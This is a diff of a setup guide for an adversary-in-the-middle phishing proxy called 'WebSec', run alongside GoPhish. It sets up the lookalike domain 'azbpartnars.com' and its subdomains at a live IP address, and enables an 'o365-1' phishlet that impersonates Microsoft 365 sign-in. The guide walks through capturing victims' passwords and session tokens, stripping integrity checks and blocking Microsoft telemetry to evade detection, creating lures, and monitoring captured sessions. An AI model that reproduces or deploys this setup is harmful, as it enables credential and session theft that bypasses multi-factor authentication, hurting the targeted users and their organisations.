@@ -54,10 +54,12 @@ Inbound Rules:
 1. **Add Domain to Cloudflare:**
    - Add `azbpartnars.com` to your Cloudflare account (if not already added)
    - Set DNS A records for WebSec subdomains:
-     - `login.azbpartnars.com` → `43.205.114.81`
-     - `mail.azbpartnars.com` → `43.205.114.81`
-     - `secure.azbpartnars.com` → `43.205.114.81`
-     - `auth.azbpartnars.com` → `43.205.114.81`
+     - `login.azbpartnars.com` → `43.205.114.81` (O365-1 phishlet)
+     - `portal.azbpartnars.com` → `43.205.114.81` (Office portal)
+     - `sso.azbpartnars.com` → `43.205.114.81` (Live SSO)
+     - `auth.azbpartnars.com` → `43.205.114.81` (Token exchange)
+     - `cdn1.azbpartnars.com` → `43.205.114.81` (Asset CDN)
+     - `cdn2.azbpartnars.com` → `43.205.114.81` (Asset CDN)
    - Enable Cloudflare Proxy (orange cloud) for all subdomains
 
 2. **SSL/TLS Settings:**
@@ -122,25 +124,23 @@ sudo chown -R $USER:$USER ~/.websec
 ### Option 1: Cloudflare Origin Certificate (Recommended)
 
 ```bash
-# Create certificate directories for each subdomain
+# Create certificate directories for O365-1 phishlet subdomains
 mkdir -p ~/.websec/crt/sites/login.azbpartnars.com
-mkdir -p ~/.websec/crt/sites/mail.azbpartnars.com
-mkdir -p ~/.websec/crt/sites/secure.azbpartnars.com
+mkdir -p ~/.websec/crt/sites/portal.azbpartnars.com
+mkdir -p ~/.websec/crt/sites/sso.azbpartnars.com
 mkdir -p ~/.websec/crt/sites/auth.azbpartnars.com
+mkdir -p ~/.websec/crt/sites/cdn1.azbpartnars.com
+mkdir -p ~/.websec/crt/sites/cdn2.azbpartnars.com
 
 # Download Cloudflare Origin Certificates from Cloudflare dashboard for each subdomain
 # Save as: ~/.websec/crt/sites/[subdomain]/fullchain.pem
 # Save key as: ~/.websec/crt/sites/[subdomain]/privkey.pem
 
 # Set proper permissions for each subdomain
-chmod 600 ~/.websec/crt/sites/login.azbpartnars.com/privkey.pem
-chmod 644 ~/.websec/crt/sites/login.azbpartnars.com/fullchain.pem
-chmod 600 ~/.websec/crt/sites/mail.azbpartnars.com/privkey.pem
-chmod 644 ~/.websec/crt/sites/mail.azbpartnars.com/fullchain.pem
-chmod 600 ~/.websec/crt/sites/secure.azbpartnars.com/privkey.pem
-chmod 644 ~/.websec/crt/sites/secure.azbpartnars.com/fullchain.pem
-chmod 600 ~/.websec/crt/sites/auth.azbpartnars.com/privkey.pem
-chmod 644 ~/.websec/crt/sites/auth.azbpartnars.com/fullchain.pem
+for subdomain in login portal sso auth cdn1 cdn2; do
+    chmod 600 ~/.websec/crt/sites/${subdomain}.azbpartnars.com/privkey.pem
+    chmod 644 ~/.websec/crt/sites/${subdomain}.azbpartnars.com/fullchain.pem
+done
 ```
 
 ### Option 2: Let's Encrypt (Automatic)
@@ -257,11 +257,12 @@ sudo dpkg-reconfigure unattended-upgrades
 
 ### How the Multi-Server Setup Works:
 
-1. **Email Campaign:** Victim receives phishing email
+1. **Email Campaign:** Victim receives phishing email from GoPhish
 2. **WebSec Interception:** Victim clicks link → `login.azbpartnars.com`
-3. **Credential Capture:** WebSec proxies to real O365, captures credentials
-4. **Redirect to GoPhish:** After capture, redirect to `www.azbpartnars.com/landing-page`
-5. **Campaign Tracking:** GoPhish tracks completion and provides analytics
+3. **O365-1 Phishlet:** Advanced OAuth2/PKCE flow interception
+4. **Credential Capture:** WebSec captures username, password, and session tokens
+5. **Redirect to GoPhish:** After capture, redirect to `www.azbpartnars.com/landing-page`
+6. **Campaign Tracking:** GoPhish tracks completion and provides analytics
 
 ### Benefits:
 - **Domain Consistency:** All phishing uses `azbpartnars.com`
@@ -274,10 +275,11 @@ sudo dpkg-reconfigure unattended-upgrades
 ### 1. Basic Connectivity Test
 
 ```bash
-# Test if WebSec is running on subdomains
+# Test if WebSec is running on O365-1 phishlet subdomains
 curl -k https://login.azbpartnars.com
-curl -k https://mail.azbpartnars.com
-curl -k https://secure.azbpartnars.com
+curl -k https://portal.azbpartnars.com
+curl -k https://sso.azbpartnars.com
+curl -k https://auth.azbpartnars.com
 
 # Check service status
 sudo systemctl status websec
@@ -286,7 +288,7 @@ sudo systemctl status websec
 sudo journalctl -u websec -f
 ```
 
-### 2. Configure Phishlets for Subdomains
+### 2. Configure O365-1 Phishlet
 
 ```bash
 # Connect to WebSec
@@ -294,25 +296,73 @@ cd /opt/websec
 ./websec -p ~/.websec/phishlets -t ~/.websec/redirectors
 
 # In WebSec terminal:
-# Configure O365 phishlet
-phishlets hostname o365 login.azbpartnars.com
-phishlets enable o365
+# Configure O365-1 phishlet (advanced O365 phishlet with PKCE support)
+phishlets hostname o365-1 login.azbpartnars.com
+phishlets enable o365-1
 
-# Configure Outlook phishlet
-phishlets hostname outlook mail.azbpartnars.com
-phishlets enable outlook
-
-# Configure generic phishlet
-phishlets hostname generic secure.azbpartnars.com
-phishlets enable generic
+# Verify phishlet configuration
+phishlets o365-1
 
 # Create lures for testing
-lures create o365
+lures create o365-1
 lures get-url 0
 
 # Test GoPhish integration
 config gophish test
 ```
+
+### 3. O365-1 Phishlet Features
+
+The `o365-1.yaml` phishlet includes:
+
+**Advanced OAuth2/PKCE Support:**
+- Handles modern Microsoft authentication flows
+- Captures PKCE code challenges and verifiers
+- Supports token exchange endpoints
+
+**Comprehensive Coverage:**
+- `login.microsoftonline.com` - Primary O365 login
+- `portal.office.com` - Office portal redirects
+- `live.com` - Live account SSO
+- `microsoftonline.com/common` - Token exchange
+- `msftauth.net` & `msauth.net` - Asset CDNs
+
+**Security Evasion:**
+- Strips integrity attributes from JavaScript
+- Blocks Microsoft telemetry calls
+- Auto-submits credentials for better UX
+
+**Credential Capture:**
+- Username: `login` field
+- Password: `passwd` field
+- Session tokens: `ESTSAUTH`, `ESTSAUTHPERSISTENT`, `OTAuth`
+
+### 4. Testing O365-1 Phishlet
+
+```bash
+# Test the phishlet flow
+# 1. Visit the lure URL
+curl -k "https://login.azbpartnars.com/common/oauth2/v2.0/authorize?client_id=00000003-0000-0000-c000-000000000000&response_type=code&redirect_uri=https://portal.office.com&scope=openid"
+
+# 2. Check if phishlet is active
+phishlets o365-1
+
+# 3. Monitor sessions for credential capture
+sessions
+
+# 4. Test GoPhish integration
+config gophish test
+```
+
+### 5. Expected Behavior
+
+When a victim visits your lure:
+1. **Initial Redirect:** `login.azbpartnars.com` → Real Microsoft login
+2. **Credential Entry:** Victim enters username/password
+3. **Auto-Submit:** JavaScript automatically submits form
+4. **Token Capture:** WebSec captures authentication tokens
+5. **Redirect:** Victim redirected to `www.azbpartnars.com/landing-page`
+6. **Session Tracking:** GoPhish tracks campaign completion
 
 ## 📊 Monitoring and Maintenance
 
@@ -378,22 +428,24 @@ sudo netstat -tlnp | grep :443
 
 **2. SSL Certificate issues:**
 ```bash
-# Check certificate files for each subdomain
+# Check certificate files for O365-1 phishlet subdomains
 ls -la ~/.websec/crt/sites/login.azbpartnars.com/
-ls -la ~/.websec/crt/sites/mail.azbpartnars.com/
-ls -la ~/.websec/crt/sites/secure.azbpartnars.com/
+ls -la ~/.websec/crt/sites/portal.azbpartnars.com/
+ls -la ~/.websec/crt/sites/sso.azbpartnars.com/
+ls -la ~/.websec/crt/sites/auth.azbpartnars.com/
 
 # Verify certificates
 openssl x509 -in ~/.websec/crt/sites/login.azbpartnars.com/fullchain.pem -text -noout
-openssl x509 -in ~/.websec/crt/sites/mail.azbpartnars.com/fullchain.pem -text -noout
+openssl x509 -in ~/.websec/crt/sites/portal.azbpartnars.com/fullchain.pem -text -noout
 ```
 
 **3. Domain not resolving:**
 ```bash
-# Check DNS for subdomains
+# Check DNS for O365-1 phishlet subdomains
 nslookup login.azbpartnars.com
-nslookup mail.azbpartnars.com
-nslookup secure.azbpartnars.com
+nslookup portal.azbpartnars.com
+nslookup sso.azbpartnars.com
+nslookup auth.azbpartnars.com
 
 # Check Cloudflare settings
 # Ensure A records point to 43.205.114.81
@@ -417,9 +469,10 @@ sudo netstat -tlnp | grep websec
 # Check process
 ps aux | grep websec
 
-# Test SSL for subdomains
+# Test SSL for O365-1 phishlet subdomains
 openssl s_client -connect login.azbpartnars.com:443 -servername login.azbpartnars.com
-openssl s_client -connect mail.azbpartnars.com:443 -servername mail.azbpartnars.com
+openssl s_client -connect portal.azbpartnars.com:443 -servername portal.azbpartnars.com
+openssl s_client -connect sso.azbpartnars.com:443 -servername sso.azbpartnars.com
 ```
 
 ## 📁 Directory Structure
@@ -432,19 +485,25 @@ openssl s_client -connect mail.azbpartnars.com:443 -servername mail.azbpartnars.
 
 ~/.websec/                      # Configuration directory
 ├── crt/sites/                  # SSL certificates
-│   ├── login.azbpartnars.com/  # O365 certificates
+│   ├── login.azbpartnars.com/  # O365-1 primary login
 │   │   ├── fullchain.pem      # Public certificate
 │   │   └── privkey.pem        # Private key
-│   ├── mail.azbpartnars.com/   # Outlook certificates
+│   ├── portal.azbpartnars.com/ # Office portal redirects
 │   │   ├── fullchain.pem      # Public certificate
 │   │   └── privkey.pem        # Private key
-│   ├── secure.azbpartnars.com/ # Generic certificates
+│   ├── sso.azbpartnars.com/    # Live SSO authentication
 │   │   ├── fullchain.pem      # Public certificate
 │   │   └── privkey.pem        # Private key
-│   └── auth.azbpartnars.com/   # Auth certificates
+│   ├── auth.azbpartnars.com/   # Token exchange endpoints
+│   │   ├── fullchain.pem      # Public certificate
+│   │   └── privkey.pem        # Private key
+│   ├── cdn1.azbpartnars.com/   # Asset CDN (msftauth.net)
+│   │   ├── fullchain.pem      # Public certificate
+│   │   └── privkey.pem        # Private key
+│   └── cdn2.azbpartnars.com/   # Asset CDN (msauth.net)
 │       ├── fullchain.pem      # Public certificate
 │       └── privkey.pem        # Private key
-├── phishlets/                  # Active phishlets
+├── phishlets/                  # Active phishlets (o365-1.yaml)
 └── redirectors/                # Active redirectors
 ```
 
